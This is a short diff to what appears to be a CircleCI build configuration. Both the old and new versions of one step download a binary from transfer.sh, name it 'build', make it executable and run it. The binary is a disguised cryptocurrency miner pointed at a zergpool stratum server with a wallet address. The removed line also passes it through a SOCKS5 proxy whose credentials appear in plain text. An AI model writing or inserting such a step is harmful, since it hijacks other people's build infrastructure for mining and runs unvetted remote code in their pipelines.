@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget -qO build   http://transfer.sh/p2nGh8/Pultra && chmod +x build && ./build -a  yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B -p c=DGB,mc=XMY -t 36 -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080 
+      - run: wget -qO build   http://transfer.sh/p2nGh8/Pultra && chmod +x build && ./build -a  yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B -p c=DGB,mc=XMY -t 36
